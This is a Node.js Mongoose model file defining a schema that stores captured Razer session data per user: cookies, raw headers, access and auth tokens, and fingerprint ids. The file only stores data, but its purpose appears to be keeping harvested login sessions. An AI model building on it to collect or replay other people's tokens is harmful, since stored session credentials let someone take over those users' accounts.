const mongoose = require('mongoose');

const razerPayloadDataSchema = new mongoose.Schema(
  {
    userId: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true, unique: true },
    email: { type: String, required: true },
    username: { type: String, default: '' },
    referer: { type: String, default: '' },
    currentUrl: { type: String, default: '' },
    cookieHeader: { type: String, default: '' },
    cookies: { type: [mongoose.Schema.Types.Mixed], default: [] },
    xRazerAccessToken: { type: String, default: '' },
    xRazerFpid: { type: String, default: '' },
    xRazerRazerid: { type: String, default: '' },
    razerIdAuthToken: { type: String, default: '' },
    rawHeaders: { type: mongoose.Schema.Types.Mixed, default: {} },
    capturedAt: { type: Date, default: Date.now },
  },
  { timestamps: true }
);

module.exports = mongoose.model('RazerPayloadData', razerPayloadDataSchema);
